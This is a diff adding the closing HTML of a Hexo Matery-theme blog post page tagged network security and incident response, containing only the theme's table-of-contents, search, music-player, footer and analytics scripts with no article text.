+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">网络安全</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
+                        <span class="chip bg-color">应急响应</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022-2023</span>
+            
+            <a href="/about" target="_blank">Broken-year</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/Broken-year" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:2011416908@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2011416908" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2011416908" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+	
+	<!-- 冒泡 -->
+	
+		<script type="text/javascript">
+			// 只在桌面版网页启用特效
+			var windowWidth = $(window).width();
+			document.write(
+				'<script type="text/javascript" src="/libs/others/buble.js"><\/script>'
+			);
+		</script>
+	
+
+	
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
